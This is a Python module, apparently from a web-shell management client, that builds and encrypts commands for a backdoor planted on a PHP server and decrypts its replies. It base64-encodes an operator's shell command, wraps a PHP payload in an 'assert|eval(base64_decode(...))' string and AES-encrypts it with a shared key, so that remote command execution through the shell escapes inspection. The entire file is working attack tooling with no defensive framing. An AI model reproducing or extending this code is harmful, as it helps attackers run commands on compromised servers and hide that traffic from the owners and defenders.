# -*- encoding: utf-8 -*-

from common.Types import LanguageType
from common.Types import PlayLoadFileName
from utils.Cryto import AESCrypt
from utils.Cryto import Base64Crypt
from utils.ReadFileGetData import ReadFileGetData
import json


class GetData:
    @staticmethod
    def getSendData(key, fileName, params, languageType: LanguageType = LanguageType.PHP):
        data = ''
        if params.get('Cmd') and fileName == PlayLoadFileName.RealCMD.value:
            params['Cmd'] = Base64Crypt.base64Encode(params['Cmd']).replace('\n','')
            print(params['Cmd'])

        if languageType is LanguageType.PHP:
            data = ReadFileGetData.getParamPHP(fileName, params)
        base64Content = Base64Crypt.base64Encode(data)
        plaintextData = "assert|eval(base64_decode('" + base64Content.replace('\n', '') + "'));"
        aesCrypt = AESCrypt(key)
        return aesCrypt.aes_encrypt(plaintextData)

    @staticmethod
    def getParseData(key, data) -> dict:
        aesCrypt = AESCrypt(key)
        decryptContent = aesCrypt.aes_decrypt(data)
        respDict = json.loads(decryptContent)
        for k, v in respDict.items():
            respDict[k] = Base64Crypt.base64Decode(v)
        return respDict
